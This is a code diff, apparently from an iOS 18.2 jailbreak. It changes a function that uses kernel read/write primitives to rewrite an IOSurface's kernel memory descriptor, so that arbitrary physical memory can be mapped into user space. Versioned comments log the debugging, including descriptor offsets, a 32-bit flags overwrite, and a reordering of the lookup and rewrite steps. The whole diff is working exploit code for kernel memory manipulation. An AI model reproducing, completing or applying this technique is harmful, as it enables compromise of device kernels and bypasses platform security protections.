@@ -158,22 +158,13 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// that only matters in the already-failing case).
 	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
 	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
-	// v77: per-window setter bisect. v76's A/B exonerated the zeroing pokes
-	// (skip == apply == lookup=0 across all 16 windows) and the 32-bit flags
-	// write landed. ONE unknown remains: does IOSurfaceLookupFromMachPort
-	// work on an UNTOUCHED 18.2 surface, or does one specific setter break
-	// it? Each window skips a different subset (bit set = skip):
-	//   bit0 ranges  bit1 size  bit2 wired  bit3 memRef  bit4 flags
-	// Window 0 = pure control (vendor path, straight to lookup). Pokes are
-	// retired everywhere (their real values live in KMAP pre,desc).
+	// v78: REORDER — v77 win0 (pure control) mapped with lookup=1, base!=0;
+	// every rewritten window had lookup=0; so rewrite AFTER lookup, then let
+	// GetBaseAddress re-walk the retargeted descriptor. No pokes (retired),
+	// flags via 32-bit write.
 	static unsigned g_kmap_seq = 0;
 	unsigned seq = g_kmap_seq++;
-	static const unsigned kSkipMasks[16] = {
-		0x3F, 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x30,
-		0x38, 0x3E, 0x3D, 0x3B, 0x37, 0x2F, 0x3F, 0x3F,
-	};
-	unsigned skip = kSkipMasks[seq & 15];
-	jb_tr_beacon("KMAP win=%u,skip=%02x", seq, skip);
+	jb_tr_beacon("KMAP win=%u", seq);
 	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
@@ -204,10 +195,26 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	if (skip & 0x01) {
-		jb_tr_beacon("KMAP ranges,skipped,orig=%llx", (unsigned long long)ranges);
+	// v78 PHASE A: lookup on the INTACT descriptor — the only configuration
+	// that maps (v77 win0: lookup=1, base!=0; every rewritten: lookup=0).
+	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
+	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
+	if (!refA) {
+		jb_tr_beacon("KMAP fail,lookupA");
+		*uaddr = NULL;
+		return -1;
 	}
-	else if (gPrimitives.krwMinSafeReadSize > 0x10) {
+	void *base0 = IOSurfaceGetBaseAddress(refA);
+	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
+	if (!base0) {
+		jb_tr_beacon("KMAP fail,base0A");
+		*uaddr = NULL;
+		return -1;
+	}
+
+	// v78 PHASE B: retarget the descriptor AFTER lookup. The tail
+	// GetBaseAddress re-walks this descriptor and maps the new ranges.
+	if (gPrimitives.krwMinSafeReadSize > 0x10) {
 		jb_tr_beacon("KMAP path,fakeranges,minsafe=%x", gPrimitives.krwMinSafeReadSize);
 		// If the primitive we have cannot read <=0x10 bytes at a time, we need to create our own struct
 		// And later clean it up when we have a better primitive in IOSurface_map_cleanup
@@ -237,33 +244,22 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		kwrite64(ranges+8, size);
 	}
 
-	if (!(skip & 0x02)) {
-		IOMemoryDescriptor_set_size(desc, size);
-	}
+	IOMemoryDescriptor_set_size(desc, size);
 
 	// v77: the 0x70/0x18/0x90 zeroing pokes are RETIRED — v76's A/B proved
 	// skip == apply (identical lookup=0 everywhere), and on 18.2 these fields
 	// held real kernel pointers. Pre-rewrite values are in KMAP pre,desc.
 
-	if (!(skip & 0x04)) {
-		IOMemoryDescriptor_set_wired(desc, true);
-	}
+	IOMemoryDescriptor_set_wired(desc, true);
 
 	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
-	if (!(skip & 0x10)) {
-		// v76: 32-bit flags write — the 8-bit setter can never clear the
-		// 0x400 bit (byte 1) of the 0x410 mask on 18.2.
-		uint32_t newflags = (flags & ~0x410) | 0x20;
-		kwrite32(desc + 0x20, newflags);
-		jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
-	}
-	else {
-		jb_tr_beacon("KMAP flags,kept=%x", flags);
-	}
+	// v76: 32-bit flags write — the 8-bit setter can never clear the
+	// 0x400 bit (byte 1) of the 0x410 mask on 18.2.
+	uint32_t newflags = (flags & ~0x410) | 0x20;
+	kwrite32(desc + 0x20, newflags);
+	jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
 
-	if (!(skip & 0x08)) {
-		IOMemoryDescriptor_set_memRef(desc, 0);
-	}
+	IOMemoryDescriptor_set_memRef(desc, 0);
 
 	// v75: full post-rewrite desc readback — diff against `pre,desc` names
 	// the exact setter that mangled (or failed to mangle) the descriptor.
@@ -277,13 +273,15 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
-	// v76: split the final verdict — v75's "lookup=0,base=0" could not say
-	// WHICH of the two calls failed.
-	jb_tr_beacon("KMAP lookup=%d", mappedSurfaceRef != NULL);
-	void *mappedBase = mappedSurfaceRef ? IOSurfaceGetBaseAddress(mappedSurfaceRef) : NULL;
-	jb_tr_beacon("KMAP base=%llx", (unsigned long long)(uintptr_t)mappedBase);
-	*uaddr = mappedBase;
+	// v78 PHASE B verdict: GetBaseAddress on the RETARGETED descriptor.
+	// base1==base0 → the call cached the original mapping (rewrite ignored)
+	// → v79 goes IOSurfaceClient walk. base1!=base0 → new mapping — the
+	// probe's 0x10000-bounded read decides HIT/miss.
+	void *base1 = IOSurfaceGetBaseAddress(refA);
+	jb_tr_beacon("KMAP B,base=%llx,base0=%llx",
+	             (unsigned long long)(uintptr_t)base1,
+	             (unsigned long long)(uintptr_t)base0);
+	*uaddr = base1;
 	return 0;
 }
 
